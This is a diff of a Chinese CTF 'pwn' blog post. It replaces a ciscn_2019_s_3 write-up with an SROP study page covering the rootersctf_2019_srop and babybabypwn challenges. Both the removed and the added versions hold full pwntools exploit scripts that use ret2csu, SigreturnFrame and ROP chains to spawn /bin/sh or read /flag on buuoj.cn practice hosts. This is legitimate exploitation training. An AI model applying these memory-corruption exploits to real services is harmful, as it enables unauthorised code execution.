@@ -9,7 +9,7 @@
     
     <title>
         
-            ciscn_2019_s_3 |
+            SROP |
         
         b1nary
     </title>
@@ -235,7 +235,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        ciscn_2019_s_3
+                        SROP
                     </div>
                 
 
@@ -261,13 +261,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-08-02</span>
+                <span class="datetime">2025-09-10</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Tue Sep 09 2025 14:11:29 GMT+0800">2025-09-09</span>
+                    <span class="datetime" data-updated="Thu Sep 11 2025 10:56:23 GMT+0800">2025-09-11</span>
                 </span>
             
         
@@ -276,7 +276,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/exercise-pwn/">exercise_pwn</a></li>
+                            <li class="category-item"><a href="/categories/pwn-study/">pwn_study</a></li>
                         
                     
                 </ul>
@@ -287,16 +287,10 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/gdb/">gdb</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/csu/">csu</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
                         
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/SROP/">SROP</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/stack/">stack</a></li>
                         
                     
                 </ul>
@@ -321,86 +315,30 @@
                     
 
                     
-                         <p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_s_3" >题目<i class="fas fa-external-link-alt"></i></a></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250909135643904.png"  alt="img"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250802155218866.png"  alt="img"></p>
-<p>没有后门函数，也没有能用来泄露libc地址的东西</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250802155343571.png"  alt="img"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250802155522017.png"  alt="image-20250802155522017">但是看到有execve和一些对寄存器的操作，考虑csu</p>
-<p>在栈上写入&#x2F;bin&#x2F;sh,之后调用它</p>
-<p>数据在栈的位置不是固定的，但是偏移是固定的</p>
-<p>可以通过read和write来泄露栈上的地址</p>
-<h2 id="scu"><a href="#scu" class="headerlink" title="scu"></a>scu</h2><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250825165336404.png"  alt="image-20250825165336404"></p>
-<p>buf的起始位置是0x7fffffffdd70，70到80之间是buf的16空间</p>
-<p>栈上0x7fffffffdd90对应的数据是一个栈 上的地址所以选择读取这个位置的地址</p>
-<p>并计算出它和buf之间的偏移以精准定位buf的头部<img     src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250825165806950.png"   alt="image-20250825165806950" style="zoom: 67%;" ></p>
-<p>且<img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250802160607786.png"  alt="image-20250802160607786"></p>
-<p>这个函数返回时直接ret，没有进行pop ebp的操作，所以在构造payload的时候不需要覆盖ebp</p>
-<p>脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=b&quot;a&quot;*16+p64(vuln)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(32)</span><br><span class="line">place=u64(p.recv(8))</span><br><span class="line">bin_sh=place-0x118</span><br><span class="line">print(hex(bin_sh))</span><br></pre></td></tr></table></figure>
+                         <h2 id="syscall-leave"><a href="#syscall-leave" class="headerlink" title="syscall_leave"></a>syscall_leave</h2><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rootersctf_2019_srop" >rootersctf_2019_srop<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250910152701713.png"  alt="image-20250910152701713"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250910152713092.png"  alt="image-20250910152713092"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250910152745176.png"  alt="image-20250910152745176"></p>
+<p>可以看到这个什么都没有，但是存在pop rax的操作，所以可以用SROP来泄露后门函数</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>用SROP第一次读入执行read函数，第二次向这个read函数读入&#x2F;bin&#x2F;sh，并让函数通过frame去执行它</p>
+<p>注意，在第一次的rbp控制，他是通过leave_ret跳转的，这个rbp是要执行函数的前一个位置，所以在第二个payload构造的时候加上“&#x2F;bin&#x2F;sh\x00”一共要填充0x38个字节才到达我们构造的read函数执行结束之后会继续执行的位置</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">file_path = &quot;./rootersctf_2019_srop&quot;</span><br><span class="line">remote_host = &quot;node5.buuoj.cn&quot;</span><br><span class="line">remote_port =27430</span><br><span class="line">#libc=ELF(&quot;&quot;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">    #gdb.attach(p, &quot;b*0x000000000401035&quot;)</span><br><span class="line"></span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line">def sa(a,b):</span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line"></span><br><span class="line">rax_sys_kea_ret=0x401032</span><br><span class="line">bss=0x402000</span><br><span class="line">syscall=0x401033</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=0</span><br><span class="line">frame.rdi=0</span><br><span class="line">frame.rsi=bss</span><br><span class="line">frame.rdx=0x400</span><br><span class="line">frame.rip=syscall</span><br><span class="line">frame.rbp=bss+0x30</span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*0x88+p64(rax_sys_kea_ret)+p64(15)+bytes(frame)</span><br><span class="line"></span><br><span class="line">sa(b&quot;Hey, can i get some feedback for the CTF?&quot;,payload)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=59</span><br><span class="line">frame.rdi=bss</span><br><span class="line">frame.rsi=0</span><br><span class="line">frame.rdx=0</span><br><span class="line">frame.rip=syscall</span><br><span class="line">pay=b&quot;/bin/sh\x00&quot;+b&quot;a&quot;*0x30+p64(rax_sys_kea_ret)+p64(15)+bytes(frame)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><p>64位时，设计后门函数需要rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0;</p>
-<p>rax&#x3D;59地址已经找到了</p>
-<p>ROPgadgets命令查看，发现只有对rdi和rsi的s操作</p>
-<p>剩下的就是基本的csu了</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250825170440668.png"  alt="image-20250825170440668"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rbx_rbp_r12_r13_r14_r15</span><br><span class="line"></span><br><span class="line">#r13&gt;rdx r14&gt;rsi r15&gt;edi</span><br><span class="line">#call r12+rbx*8</span><br><span class="line">#add     rbx, 1</span><br><span class="line">#cmp     rbx, rbp</span><br></pre></td></tr></table></figure>
 
-<p><strong>设置好rdx、rsi、rdi，然后调用 syscall</strong></p>
-<p>首先r14和r13一定要赋值为0，而且r15d的值</p>
-<p>函数会跳转到r12+rbx*8,让它最后修改rdi然后执行调用syscall，所以r12要赋值为payload中的pop rdi的地方，rbx赋值0</p>
-<p>且只调用一次</p>
-<p>所以rbp&#x3D;1</p>
-<p>最终执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, 59       ; syscall number for execve</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
 
-<p><strong>脚本</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)</span><br><span class="line">payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3</span><br><span class="line">payload += p64(mov) + p64(rax)</span><br><span class="line">payload += p64(rdi) + p64(bin_sh) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意</strong></p>
-<p>✅ mov edi, r15d和 rdi 的关系</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edi, r15d</span><br></pre></td></tr></table></figure>
-
-<p>只看语法，是：</p>
+<h2 id="call-syscall"><a href="#call-syscall" class="headerlink" title="call_syscall"></a>call_syscall</h2><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[V&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]babybabypwn" >题目<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250911104624373.png"  alt="image-20250911104624373"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250911104652317.png"  alt="image-20250911104652317"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250911104855837.png"  alt="image-20250911104855837"></p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>可以看到，开启了pie保护，但程序会输出puts的地址，可以通过puts的地址去泄露libc基地址，但是canary保护限制了执行的范围，所以可以通过syscall(15)去使用SigreturnFrame，设计寄存器让函数输入&#x2F;flaghe orw的攻击，最后控制rsp去执行这个orw</p>
 <blockquote>
-<p>把 r15d的值（32 位）赋给 edi（也是 32 位）</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250911105203247.png"  alt="image-20250911105203247">	</p>
+<p>这里不是syscall，而是调用syscall，调用会push rsp，会导致不满16字节，所以舍去我们构造的frame的前8个字节</p>
+<p>详解可以看师傅<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/14527653.html" >不会修电脑的师傅<i class="fas fa-external-link-alt"></i></a></p>
 </blockquote>
-<p>但这里有个关键点：</p>
-<blockquote>
-<p>在 x86-64 架构中，<strong>对 rdi 的低 32 位写入（edi）时，高 32 位会被清零！</strong></p>
-</blockquote>
-<p>🔍 举个例子</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 0x4141414141414141</span><br><span class="line">mov edi, 0x42424242</span><br></pre></td></tr></table></figure>
-
-<p>执行完第二条指令后，rdi的值是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdi == 0x0000000042424242</span><br></pre></td></tr></table></figure>
-
-<p>也就是说：</p>
-<blockquote>
-<p><strong>写 <code>edi</code> 相当于先清空 <code>rdi</code>，再写低 32 位</strong></p>
-</blockquote>
-<p>mov edi, r15d其实等价于：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdi = r15 &amp; 0xffffffff</span><br></pre></td></tr></table></figure>
-
-<p>所以你能用它来设置 rdi 的值前提是你设置的 r15 是一个 32 位以内的地址（或者值），比如 &#x2F;bin&#x2F;sh 的地址必须低于 0x100000000，否则会丢高位，导致 execve 崩溃或 syscall 参数错误</p>
-<p>所以要之后再放设置rdi的值</p>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=process(&quot;./ciscn_s_3&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,28493)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">syscall=0x400517</span><br><span class="line">vuln=0x4004ED</span><br><span class="line">rdi=0x4005a3</span><br><span class="line">rax=0x4004E2</span><br><span class="line">pop6=0x40059A#rbx_rbp_r12_r13_r14_r15</span><br><span class="line"></span><br><span class="line">mov=0x400580#r13&gt;rdx r14&gt;rsi r15&gt;edi</span><br><span class="line">            #call r12+rbx*8</span><br><span class="line">            #add     rbx, 1</span><br><span class="line">            #cmp     rbx, rbp</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*16+p64(vuln)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(32)</span><br><span class="line">place=u64(p.recv(8))</span><br><span class="line">bin_sh=place-0x118</span><br><span class="line">print(hex(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)</span><br><span class="line">payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3</span><br><span class="line">payload += p64(mov) + p64(rax)</span><br><span class="line">payload += p64(rdi) + p64(bin_sh) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250825185946691.png"  alt="image-20250825185946691"></p>
-<p>题目中也有sigframe</p>
-<h3 id="SROP-攻击的原理"><a href="#SROP-攻击的原理" class="headerlink" title="SROP 攻击的原理"></a>SROP 攻击的原理</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250825190005837.png"  alt="image-20250825190005837"></p>
-<ol>
-<li><strong>内核保存上下文（步骤 ①）</strong>：当程序接收到信号时，内核会暂停程序的执行，并自动将当前所有寄存器（<code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rip</code>, <code>rsp</code> 等）的状态保存到一个特殊的结构体中，这个结构体叫做 <code>sigcontext</code>。然后，内核将这个 <code>sigcontext</code> 压入栈中，为执行信号处理函数做准备。</li>
-<li><strong>攻击者伪造上下文</strong>：攻击者利用栈溢出漏洞，在程序接收信号<strong>之前</strong>，就向栈中写入一个<strong>伪造的 <code>sigcontext</code> 结构体</strong>。这个伪造的结构体中包含了攻击者想要设置的所有寄存器值。例如，你可以把 <code>rip</code> 设置为 <code>execve</code> 的地址，把 <code>rdi</code> 设置为 <code>/bin/sh</code> 字符串的地址。</li>
-<li><strong>触发 <code>sigreturn</code> 系统调用</strong>：攻击者通过构造 ROP 链，使程序执行流跳转到一个能够执行 <code>sigreturn</code> 系统调用的 gadget。<code>sigreturn</code> 是一个特殊的系统调用，它的功能就是从栈中读取 <code>sigcontext</code> 结构体，并恢复寄存器状态。攻击者通常会找到一个 <code>mov rax, 0xf; syscall;</code> 这样的 gadget，其中 <code>0xf</code> 是 <code>sigreturn</code> 系统调用的编号。</li>
-<li><strong>内核恢复上下文（步骤 ③）</strong>：当 <code>syscall</code> 执行后，内核会发现 <code>rax</code> 的值为 <code>0xf</code>，便会执行 <code>sigreturn</code>。正如你所说，<strong>内核在执行这一步时不会去校验栈上数据的合法性</strong>。它会盲目地信任栈上的数据，从栈顶读取我们伪造的 <code>sigcontext</code> 结构体，并用里面的值来恢复所有的寄存器。</li>
-<li><strong>劫持程序执行流（步骤 ④）</strong>：由于我们已经将伪造的 <code>sigcontext</code> 中的 <code>rip</code> 设置为 <code>execve</code> 的地址，<code>rdi</code> 设置为 <code>/bin/sh</code> 的地址，程序恢复寄存器后，会立即跳转到 <code>execve</code> 函数执行，并以 <code>/bin/sh</code> 作为参数，最终获得一个 Shell。</li>
-</ol>
-<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;] </span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,27869)</span><br><span class="line"></span><br><span class="line">syscall_ret = 0x0400517</span><br><span class="line">data = 0x0601020</span><br><span class="line">mov_rax_0xf = 0x4004DA</span><br><span class="line">#两次Sigreturn，第一次输入/bin/sh\x00</span><br><span class="line">#第二次执行execve(&quot;/bin/sh&quot;,0,0)</span><br><span class="line"></span><br><span class="line">vuln = 0x04004ED</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + b&#x27;a&#x27;*8 + p64(vuln)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(0x20)</span><br><span class="line">bin_sh = u64(p.recv(8)) - 280</span><br><span class="line">print(&quot;bin_sh_addr =================== &quot;,hex(bin_sh))</span><br><span class="line"> </span><br><span class="line">#第二次Sigreturn</span><br><span class="line">payload = [ b&#x27;/bin/sh\x00&#x27;,b&#x27;a&#x27;*0x8,mov_rax_0xf,syscall_ret]#先设计rax的值，然后syscall去触发这个</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 59</span><br><span class="line">frame.rdi = bin_sh</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">payload.append(bytes(frame))</span><br><span class="line">p.sendline(flat(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">file_path = &quot;./babypwn&quot;</span><br><span class="line">remote_host = &quot;node5.buuoj.cn&quot;</span><br><span class="line">remote_port = 26643</span><br><span class="line">libc = ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">    #gdb.attach(p, &quot;b* printf&quot;)</span><br><span class="line"></span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line">def sa(a,b):</span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;0x&quot;)</span><br><span class="line">puts = int(p.recv(12), 16)</span><br><span class="line">print(b&quot;puts==================&quot;+hex(puts).encode())</span><br><span class="line"></span><br><span class="line">libc_base= puts - libc.symbols[&quot;puts&quot;]</span><br><span class="line">open_addr = libc_base + libc.symbols[&#x27;open&#x27;] </span><br><span class="line">read_addr = libc_base + libc.symbols[&#x27;read&#x27;]</span><br><span class="line">write_addr = libc_base + libc.symbols[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">bss = libc_base + 0x00000000003c6000</span><br><span class="line">rdi = libc_base + 0x21102 </span><br><span class="line">rsi = libc_base + 0x202e8 </span><br><span class="line">rdx = libc_base + 0x1b92 </span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = bss</span><br><span class="line">frame.rdx = 0x200</span><br><span class="line">frame.rip = read_addr</span><br><span class="line">frame.rsp = bss+8</span><br><span class="line">pay = bytes(frame)[8:]</span><br><span class="line">p.sendlineafter(b&#x27;Please input magic message: &#x27;, pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;/flag\x00\x00\x00&quot;+p64(rdi) + p64(bss) + p64(rsi) + p64(0) + p64(open_addr)</span><br><span class="line">payload += p64(rdi) + p64(3) + p64(rsi) + p64(bss) + p64(rdx) + p64(0x100) + p64(read_addr)</span><br><span class="line">payload += p64(rdi) + p64(1) + p64(rsi) + p64(bss) + p64(rdx) + p64(0x100) + p64(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
@@ -416,19 +354,11 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/gdb/">gdb</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/csu/">csu</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
                                         <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/SROP/">SROP</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/stack/">stack</a>
                                     </li>
                                 
                             </ul>
@@ -467,31 +397,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/08/02/libc%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/"
-                                   title="libc版本切换"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">libc版本切换</span>
-                                        <span class="post-nav-item">Prev posts</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/08/01/%E6%A0%88%E8%BF%81%E7%A7%BB/"
-                                   title="栈迁移"
+                                   href="/2025/09/09/odd-canary/"
+                                   title="odd_canary"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">栈迁移</span>
+                                        <span class="post-nav-title-item text-ellipsis">odd_canary</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -519,7 +433,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#scu"><span class="nav-text">scu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8"><span class="nav-text">调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SROP"><span class="nav-text">SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SROP-%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-text">SROP 攻击的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="nav-text">脚本</span></a></li></ol></li></ol>
